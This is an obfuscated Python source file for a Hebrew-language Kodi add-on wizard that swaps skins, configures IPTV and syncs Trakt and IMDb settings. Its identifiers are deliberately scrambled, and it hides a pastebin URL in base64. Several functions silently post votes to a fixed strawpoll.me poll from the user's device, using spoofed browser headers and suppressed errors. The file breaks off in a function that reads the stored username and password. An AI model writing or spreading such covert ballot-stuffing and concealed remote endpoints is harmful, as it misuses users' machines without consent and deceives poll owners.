# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:41
ADDONTITLE =uservar .ADDONTITLE #line:42
ADDON =wiz .addonId (ADDON_ID )#line:43
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:44
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:45
DIALOG =xbmcgui .Dialog ()#line:46
DP =xbmcgui .DialogProgress ()#line:47
HOME =xbmc .translatePath ('special://home/')#line:48
LOG =xbmc .translatePath ('special://logpath/')#line:49
PROFILE =xbmc .translatePath ('special://profile/')#line:50
ADDONS =os .path .join (HOME ,'addons')#line:51
USERDATA =os .path .join (HOME ,'userdata')#line:52
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:53
PACKAGES =os .path .join (ADDONS ,'packages')#line:54
ADDOND =os .path .join (USERDATA ,'addon_data')#line:55
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:56
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:57
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:58
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:59
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:60
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:61
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:62
DATABASE =os .path .join (USERDATA ,'Database')#line:63
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:64
ICON =os .path .join (ADDONPATH ,'icon.png')#line:65
ART =os .path .join (ADDONPATH ,'resources','art')#line:66
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:67
DP2 =xbmcgui .DialogProgressBG ()#line:68
SKIN =xbmc .getSkinDir ()#line:69
BUILDNAME =wiz .getS ('buildname')#line:70
DEFAULTSKIN =wiz .getS ('defaultskin')#line:71
DEFAULTNAME =wiz .getS ('defaultskinname')#line:72
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:73
BUILDVERSION =wiz .getS ('buildversion')#line:74
BUILDTHEME =wiz .getS ('buildtheme')#line:75
BUILDLATEST =wiz .getS ('latestversion')#line:76
INSTALLMETHOD =wiz .getS ('installmethod')#line:77
SHOW15 =wiz .getS ('show15')#line:78
SHOW16 =wiz .getS ('show16')#line:79
SHOW17 =wiz .getS ('show17')#line:80
SHOW18 =wiz .getS ('show18')#line:81
SHOWADULT =wiz .getS ('adult')#line:82
SHOWMAINT =wiz .getS ('showmaint')#line:83
AUTOCLEANUP =wiz .getS ('autoclean')#line:84
AUTOCACHE =wiz .getS ('clearcache')#line:85
AUTOPACKAGES =wiz .getS ('clearpackages')#line:86
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:87
AUTOFEQ =wiz .getS ('autocleanfeq')#line:88
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:89
INCLUDENAN =wiz .getS ('includenan')#line:90
INCLUDEURL =wiz .getS ('includeurl')#line:91
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:92
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:93
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:94
INCLUDEVIDEO =wiz .getS ('includevideo')#line:95
INCLUDEALL =wiz .getS ('includeall')#line:96
INCLUDEBOB =wiz .getS ('includebob')#line:97
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:98
INCLUDESPECTO =wiz .getS ('includespecto')#line:99
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:100
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:101
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:102
INCLUDESALTS =wiz .getS ('includesalts')#line:103
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:104
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:105
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:106
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:107
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:108
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:109
INCLUDEURANUS =wiz .getS ('includeuranus')#line:110
SEPERATE =wiz .getS ('seperate')#line:111
NOTIFY =wiz .getS ('notify')#line:112
NOTEDISMISS =wiz .getS ('notedismiss')#line:113
NOTEID =wiz .getS ('noteid')#line:114
NOTIFY2 =wiz .getS ('notify2')#line:115
NOTEID2 =wiz .getS ('noteid2')#line:116
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:117
NOTIFY3 =wiz .getS ('notify3')#line:118
NOTEID3 =wiz .getS ('noteid3')#line:119
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:120
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:121
TRAKTSAVE =wiz .getS ('traktlastsave')#line:122
REALSAVE =wiz .getS ('debridlastsave')#line:123
LOGINSAVE =wiz .getS ('loginlastsave')#line:124
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:125
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:126
KEEPINFO =wiz .getS ('keepinfo')#line:127
KEEPSOUND =wiz .getS ('keepsound')#line:129
KEEPVIEW =wiz .getS ('keepview')#line:130
KEEPSKIN =wiz .getS ('keepskin')#line:131
KEEPADDONS =wiz .getS ('keepaddons')#line:132
KEEPSKIN2 =wiz .getS ('keepskin2')#line:133
KEEPSKIN3 =wiz .getS ('keepskin3')#line:134
KEEPTORNET =wiz .getS ('keeptornet')#line:135
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:136
KEEPPVR =wiz .getS ('keeppvr')#line:137
ENABLE =uservar .ENABLE #line:138
KEEPVICTORY =wiz .getS ('keepvictory')#line:139
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:140
KEEPTVLIST =wiz .getS ('keeptvlist')#line:141
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:142
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:143
KEEPHUBTV =wiz .getS ('keephubtv')#line:144
KEEPHUBVOD =wiz .getS ('keephubvod')#line:145
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:146
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:147
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:148
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:149
HARDWAER =wiz .getS ('action')#line:150
USERNAME =wiz .getS ('user')#line:151
PASSWORD =wiz .getS ('pass')#line:152
KEEPWEATHER =wiz .getS ('keepweather')#line:153
KEEPFAVS =wiz .getS ('keepfavourites')#line:154
KEEPSOURCES =wiz .getS ('keepsources')#line:155
KEEPPROFILES =wiz .getS ('keepprofiles')#line:156
KEEPADVANCED =wiz .getS ('keepadvanced')#line:157
KEEPREPOS =wiz .getS ('keeprepos')#line:158
KEEPSUPER =wiz .getS ('keepsuper')#line:159
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:160
KEEPTRAKT =wiz .getS ('keeptrakt')#line:161
KEEPREAL =wiz .getS ('keepdebrid')#line:162
KEEPRD2 =wiz .getS ('keeprd2')#line:163
KEEPLOGIN =wiz .getS ('keeplogin')#line:164
LOGINSAVE =wiz .getS ('loginlastsave')#line:165
DEVELOPER =wiz .getS ('developer')#line:166
THIRDPARTY =wiz .getS ('enable3rd')#line:167
THIRD1NAME =wiz .getS ('wizard1name')#line:168
THIRD1URL =wiz .getS ('wizard1url')#line:169
THIRD2NAME =wiz .getS ('wizard2name')#line:170
THIRD2URL =wiz .getS ('wizard2url')#line:171
THIRD3NAME =wiz .getS ('wizard3name')#line:172
THIRD3URL =wiz .getS ('wizard3url')#line:173
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:174
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:175
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:176
TODAY =date .today ()#line:177
TOMORROW =TODAY +timedelta (days =1 )#line:178
THREEDAYS =TODAY +timedelta (days =3 )#line:179
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:180
MCNAME =wiz .mediaCenter ()#line:181
EXCLUDES =uservar .EXCLUDES #line:182
SPEEDFILE =uservar .SPEEDFILE #line:183
APKFILE =uservar .APKFILE #line:184
YOUTUBETITLE =uservar .YOUTUBETITLE #line:185
YOUTUBEFILE =uservar .YOUTUBEFILE #line:186
SPEED =uservar .SPEED #line:187
UNAME =uservar .UNAME #line:188
ADDONFILE =uservar .ADDONFILE #line:189
ADVANCEDFILE =uservar .ADVANCEDFILE #line:190
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:191
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:192
NOTIFICATION =uservar .NOTIFICATION #line:193
NOTIFICATION2 =uservar .NOTIFICATION2 #line:194
NOTIFICATION3 =uservar .NOTIFICATION3 #line:195
HELPINFO =uservar .HELPINFO #line:196
ENABLE =uservar .ENABLE #line:197
HEADERMESSAGE =uservar .HEADERMESSAGE #line:198
AUTOUPDATE =uservar .AUTOUPDATE #line:199
WIZARDFILE =uservar .WIZARDFILE #line:200
HIDECONTACT =uservar .HIDECONTACT #line:201
SKINID18 =uservar .SKINID18 #line:202
SKINID18DDONXML =uservar .SKINID18DDONXML #line:203
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:204
SKINID17 =uservar .SKINID17 #line:205
SKINID17DDONXML =uservar .SKINID17DDONXML #line:206
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:207
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:208
CONTACT =uservar .CONTACT #line:209
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:210
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:211
HIDESPACERS =uservar .HIDESPACERS #line:212
TMDB_NEW_API =uservar .TMDB_NEW_API #line:213
COLOR1 =uservar .COLOR1 #line:214
COLOR2 =uservar .COLOR2 #line:215
THEME1 =uservar .THEME1 #line:216
THEME2 =uservar .THEME2 #line:217
THEME3 =uservar .THEME3 #line:218
THEME4 =uservar .THEME4 #line:219
THEME5 =uservar .THEME5 #line:220
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:222
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:223
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:224
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:225
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:226
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:227
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:228
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:229
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:230
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:231
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:232
LOGFILES =wiz .LOGFILES #line:233
TRAKTID =traktit .TRAKTID #line:234
DEBRIDID =debridit .DEBRIDID #line:235
LOGINID =loginit .LOGINID #line:236
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:237
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:238
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:239
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:240
fullsecfold =xbmc .translatePath ('special://home')#line:241
addons_folder =os .path .join (fullsecfold ,'addons')#line:243
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:245
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:247
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:249
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:250
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:251
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:254
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:255
def MainMenu ():#line:262
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:264
def skinWIN ():#line:265
	idle ()#line:266
	OO0O0O0O00000O00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:267
	O0O000OO0OOOOO0O0 =[];O0O0000O00OOO00O0 =[]#line:268
	for O0OO0O0OOO000O0O0 in sorted (OO0O0O0O00000O00O ,key =lambda OOOOOO0OOOOOO0OOO :OOOOOO0OOOOOO0OOO ):#line:269
		O0OO00O0O0O00OO0O =os .path .split (O0OO0O0OOO000O0O0 [:-1 ])[1 ]#line:270
		O0O0OO00O0000OO0O =os .path .join (O0OO0O0OOO000O0O0 ,'addon.xml')#line:271
		if os .path .exists (O0O0OO00O0000OO0O ):#line:272
			O0O0OOOO0O0000O00 =open (O0O0OO00O0000OO0O )#line:273
			O00OOOO0000O0O0O0 =O0O0OOOO0O0000O00 .read ()#line:274
			O0OO00OOO000O0O00 =parseDOM2 (O00OOOO0000O0O0O0 ,'addon',ret ='id')#line:275
			OO00O00OOOOO0O00O =O0OO00O0O0O00OO0O if len (O0OO00OOO000O0O00 )==0 else O0OO00OOO000O0O00 [0 ]#line:276
			try :#line:277
				OOOO000OOOO0O0OO0 =xbmcaddon .Addon (id =OO00O00OOOOO0O00O )#line:278
				O0O000OO0OOOOO0O0 .append (OOOO000OOOO0O0OO0 .getAddonInfo ('name'))#line:279
				O0O0000O00OOO00O0 .append (OO00O00OOOOO0O00O )#line:280
			except :#line:281
				pass #line:282
	OO0OOO000OOO0O0O0 =[];OOO0000O0OOOO0OOO =0 #line:283
	O000OOOOOOOOO00O0 =["Current Skin -- %s"%currSkin ()]+O0O000OO0OOOOO0O0 #line:284
	OOO0000O0OOOO0OOO =DIALOG .select ("Select the Skin you want to swap with.",O000OOOOOOOOO00O0 )#line:285
	if OOO0000O0OOOO0OOO ==-1 :return #line:286
	else :#line:287
		O00000O000O0OO00O =(OOO0000O0OOOO0OOO -1 )#line:288
		OO0OOO000OOO0O0O0 .append (O00000O000O0OO00O )#line:289
		O000OOOOOOOOO00O0 [OOO0000O0OOOO0OOO ]="%s"%(O0O000OO0OOOOO0O0 [O00000O000O0OO00O ])#line:290
	if OO0OOO000OOO0O0O0 ==None :return #line:291
	for O00OOOO000000O000 in OO0OOO000OOO0O0O0 :#line:292
		swapSkins (O0O0000O00OOO00O0 [O00OOOO000000O000 ])#line:293
def currSkin ():#line:295
	return xbmc .getSkinDir ('Container.PluginName')#line:296
def swapSkins (OO0OOO000O0OOO0O0 ,title ="Error"):#line:297
	O0OO000000OOO00O0 ='lookandfeel.skin'#line:298
	OOO0OO0000O0OO00O =OO0OOO000O0OOO0O0 #line:299
	O0O00OOO0OO000000 =getOld (O0OO000000OOO00O0 )#line:300
	OO0O0O000OOO0000O =O0OO000000OOO00O0 #line:301
	setNew (OO0O0O000OOO0000O ,OOO0OO0000O0OO00O )#line:302
	OOO0OOOO0OO00O00O =0 #line:303
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0OOOO0OO00O00O <100 :#line:304
		OOO0OOOO0OO00O00O +=1 #line:305
		xbmc .sleep (1 )#line:306
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:307
		xbmc .executebuiltin ('SendClick(11)')#line:308
	return True #line:309
def getOld (O0OOOOO00OOOO0OO0 ):#line:311
	try :#line:312
		O0OOOOO00OOOO0OO0 ='"%s"'%O0OOOOO00OOOO0OO0 #line:313
		O0OOO000OO0O0000O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOOOO00OOOO0OO0 )#line:314
		OOOO0O0OOOO0O00OO =xbmc .executeJSONRPC (O0OOO000OO0O0000O )#line:316
		OOOO0O0OOOO0O00OO =simplejson .loads (OOOO0O0OOOO0O00OO )#line:317
		if OOOO0O0OOOO0O00OO .has_key ('result'):#line:318
			if OOOO0O0OOOO0O00OO ['result'].has_key ('value'):#line:319
				return OOOO0O0OOOO0O00OO ['result']['value']#line:320
	except :#line:321
		pass #line:322
	return None #line:323
def setNew (OO0O000OO0O00O0O0 ,O00O0OOOOOO00OO00 ):#line:326
	try :#line:327
		OO0O000OO0O00O0O0 ='"%s"'%OO0O000OO0O00O0O0 #line:328
		O00O0OOOOOO00OO00 ='"%s"'%O00O0OOOOOO00OO00 #line:329
		OO0O00OOOO00000OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O000OO0O00O0O0 ,O00O0OOOOOO00OO00 )#line:330
		O0O0O00000OO0OO0O =xbmc .executeJSONRPC (OO0O00OOOO00000OO )#line:332
	except :#line:333
		pass #line:334
	return None #line:335
def idle ():#line:336
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:337
def resetkodi ():#line:339
		if xbmc .getCondVisibility ('system.platform.windows'):#line:340
			OOOO0OOO000O00000 =xbmcgui .DialogProgress ()#line:341
			OOOO0OOO000O00000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:344
			OOOO0OOO000O00000 .update (0 )#line:345
			for OO0000OO0O0O0OO0O in range (5 ,-1 ,-1 ):#line:346
				time .sleep (1 )#line:347
				OOOO0OOO000O00000 .update (int ((5 -OO0000OO0O0O0OO0O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0000OO0O0O0OO0O ),'')#line:348
				if OOOO0OOO000O00000 .iscanceled ():#line:349
					from resources .libs import win #line:350
					return None ,None #line:351
			from resources .libs import win #line:352
		else :#line:353
			OOOO0OOO000O00000 =xbmcgui .DialogProgress ()#line:354
			OOOO0OOO000O00000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:357
			OOOO0OOO000O00000 .update (0 )#line:358
			for OO0000OO0O0O0OO0O in range (5 ,-1 ,-1 ):#line:359
				time .sleep (1 )#line:360
				OOOO0OOO000O00000 .update (int ((5 -OO0000OO0O0O0OO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0000OO0O0O0OO0O ),'')#line:361
				if OOOO0OOO000O00000 .iscanceled ():#line:362
					os ._exit (1 )#line:363
					return None ,None #line:364
			os ._exit (1 )#line:365
def backtokodi ():#line:367
			wiz .kodi17Fix ()#line:368
			fix18update ()#line:369
			fix17update ()#line:370
def testcommand1 ():#line:372
    import requests #line:373
    O0O0000OO0OO00000 ='18773068'#line:374
    OO0OO00O000O00OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0000OO0OO00000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:386
    OO0OOOOO0OO00O00O ='145273320'#line:388
    O000OO00O0000OOOO ='145272688'#line:389
    if ADDON .getSetting ("auto_rd")=='true':#line:390
        OO0O0O0OO0O0O0O0O =OO0OOOOO0OO00O00O #line:391
    else :#line:392
        OO0O0O0OO0O0O0O0O =O000OO00O0000OOOO #line:393
    OO000O0O0O0OOO0OO ={'options':OO0O0O0OO0O0O0O0O }#line:397
    OO000OOO0OOOO00O0 =requests .post ('https://www.strawpoll.me/'+O0O0000OO0OO00000 ,headers =OO0OO00O000O00OO0 ,data =OO000O0O0O0OOO0OO )#line:399
def builde_Votes ():#line:400
   try :#line:401
        import requests #line:402
        OO0OO00O0OO00OO00 ='18773068'#line:403
        OOO00O00O00OOOOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OO00O0OO00OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:415
        O000OO00OO0O000O0 ='145273320'#line:417
        O0OO0OO0OO0OO0O00 ={'options':O000OO00OO0O000O0 }#line:423
        OO000O00OOO0OO0O0 =requests .post ('https://www.strawpoll.me/'+OO0OO00O0OO00OO00 ,headers =OOO00O00O00OOOOO0 ,data =O0OO0OO0OO0OO0O00 )#line:425
   except :pass #line:426
def update_Votes ():#line:427
   try :#line:428
        import requests #line:429
        OO00O0O0O0O000000 ='18773068'#line:430
        OOOOO000O0OOOO0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00O0O0O0O000000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:442
        OO0OO0O0O00O000OO ='145273321'#line:444
        OOOOO00OO0O00OOOO ={'options':OO0OO0O0O00O000OO }#line:450
        OO00OO0000OO00O0O =requests .post ('https://www.strawpoll.me/'+OO00O0O0O0O000000 ,headers =OOOOO000O0OOOO0O0 ,data =OOOOO00OO0O00OOOO )#line:452
   except :pass #line:453
def testcommand ():#line:457
 OOO000OOO0000O0OO =os .path .dirname (os .path .realpath (__file__ ))#line:458
 OO0000O0OOOOO0OOO =os .path .join (OOO000OOO0000O0OO ,'changelog.txt')#line:459
 O000O00000O00OOOO =open (OO0000O0OOOOO0OOO ,'r')#line:460
 OO000OO000OOO0OOO =O000O00000O00OOOO .read ()#line:461
 O0OO0O0O0OO0000OO =OO000OO000OOO0OOO #line:462
 notify .updateinfo (O0OO0O0O0OO0000OO ,True )#line:463
def skin_homeselect ():#line:464
	try :#line:466
		OOOOO0O00O0OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:467
		O0O0OOOOOOOO000OO =open (OOOOO0O00O0OO0O00 ,'r')#line:469
		O0OOOOOO0OO0O000O =O0O0OOOOOOOO000OO .read ()#line:470
		O0O0OOOOOOOO000OO .close ()#line:471
		OO0O0O000O00000O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:472
		OOOOO00O000O0000O =re .compile (OO0O0O000O00000O0 ).findall (O0OOOOOO0OO0O000O )[0 ]#line:473
		O0O0OOOOOOOO000OO =open (OOOOO0O00O0OO0O00 ,'w')#line:474
		O0O0OOOOOOOO000OO .write (O0OOOOOO0OO0O000O .replace ('<setting id="HomeS" type="string%s/setting>'%OOOOO00O000O0000O ,'<setting id="HomeS" type="string"></setting>'))#line:475
		O0O0OOOOOOOO000OO .close ()#line:476
	except :#line:477
		pass #line:478
def autotrakt ():#line:481
    OOO0000O00O0OO0O0 =(ADDON .getSetting ("auto_trk"))#line:482
    if OOO0000O00O0OO0O0 =='true':#line:483
       from resources .libs import trk_aut #line:484
def traktsync ():#line:486
     OOOO0OO00OO0000O0 =(ADDON .getSetting ("auto_trk"))#line:487
     if OOOO0OO00OO0000O0 =='true':#line:488
       from resources .libs import trk_aut #line:491
     else :#line:492
        ADDON .openSettings ()#line:493
def imdb_synck ():#line:495
   try :#line:496
     O0O000OOO000O00O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:497
     O00OOOO000OO0O0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:498
     O00O0O000000O0O0O =(ADDON .getSetting ("imdb_sync"))#line:499
     OO0O00OOOO000O00O ="imdb.user"#line:500
     OOOOO00000O0O00O0 ="accounts.informants.imdb.user"#line:501
     O0O000OOO000O00O0 .setSetting (OO0O00OOOO000O00O ,str (O00O0O000000O0O0O ))#line:502
     O00OOOO000OO0O0O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:503
     O00OOOO000OO0O0O0 .setSetting (OOOOO00000O0O00O0 ,str (O00O0O000000O0O0O ))#line:504
   except :pass #line:505
def dis_or_enable_addon (OO00O00000O0OO000 ,OOOOO00000OO00000 ,enable ="true"):#line:507
    import json #line:508
    O00OOOO00O00O0000 ='"%s"'%OO00O00000O0OO000 #line:509
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O00000O0OO000 )and enable =="true":#line:510
        logging .warning ('already Enabled')#line:511
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00O00000O0OO000 )#line:512
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O00000O0OO000 )and enable =="false":#line:513
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00O00000O0OO000 )#line:514
    else :#line:515
        OOO0OO000000O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOOO00O00O0000 ,enable )#line:516
        OO00OO000OOOO00O0 =xbmc .executeJSONRPC (OOO0OO000000O0O0O )#line:517
        OOOO0O0O00OO00OO0 =json .loads (OO00OO000OOOO00O0 )#line:518
        if enable =="true":#line:519
            xbmc .log ("### Enabled %s, response = %s"%(OO00O00000O0OO000 ,OOOO0O0O00OO00OO0 ))#line:520
        else :#line:521
            xbmc .log ("### Disabled %s, response = %s"%(OO00O00000O0OO000 ,OOOO0O0O00OO00OO0 ))#line:522
    if OOOOO00000OO00000 =='auto':#line:523
     return True #line:524
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:525
def iptvset ():#line:528
  try :#line:529
    OOOOO000OO0O0OOO0 =(ADDON .getSetting ("iptv_on"))#line:530
    if OOOOO000OO0O0OOO0 =='true':#line:532
       if KODIV >=17 and KODIV <18 :#line:534
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:535
         O0000OOOOO0OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:536
         OO00O000O0O0O00OO =(ADDON .getSetting ("iptvUrl"))#line:538
         O0000OOOOO0OO0O0O .setSetting ('m3uUrl',OO00O000O0O0O00OO )#line:539
         OOO0OO00OO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:540
         O0000OOOOO0OO0O0O .setSetting ('epgUrl',OOO0OO00OO0OOOO0O )#line:541
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:544
         iptvsimpldownpc ()#line:545
         wiz .kodi17Fix ()#line:546
         xbmc .sleep (1000 )#line:547
         O0000OOOOO0OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:548
         OO00O000O0O0O00OO =(ADDON .getSetting ("iptvUrl"))#line:549
         O0000OOOOO0OO0O0O .setSetting ('m3uUrl',OO00O000O0O0O00OO )#line:550
         OOO0OO00OO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:551
         O0000OOOOO0OO0O0O .setSetting ('epgUrl',OOO0OO00OO0OOOO0O )#line:552
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:554
         iptvsimpldown ()#line:555
         wiz .kodi17Fix ()#line:556
         xbmc .sleep (1000 )#line:557
         O0000OOOOO0OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:558
         OO00O000O0O0O00OO =(ADDON .getSetting ("iptvUrl"))#line:559
         O0000OOOOO0OO0O0O .setSetting ('m3uUrl',OO00O000O0O0O00OO )#line:560
         OOO0OO00OO0OOOO0O =(ADDON .getSetting ("epg_Url"))#line:561
         O0000OOOOO0OO0O0O .setSetting ('epgUrl',OOO0OO00OO0OOOO0O )#line:562
  except :pass #line:563
def howsentlog ():#line:570
       try :#line:571
          import json #line:572
          OOOOOO0O00O00OO0O =(ADDON .getSetting ("user"))#line:573
          OO0OO0O000OO00OO0 =(ADDON .getSetting ("pass"))#line:574
          O00OOO0OO0O0OO0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:575
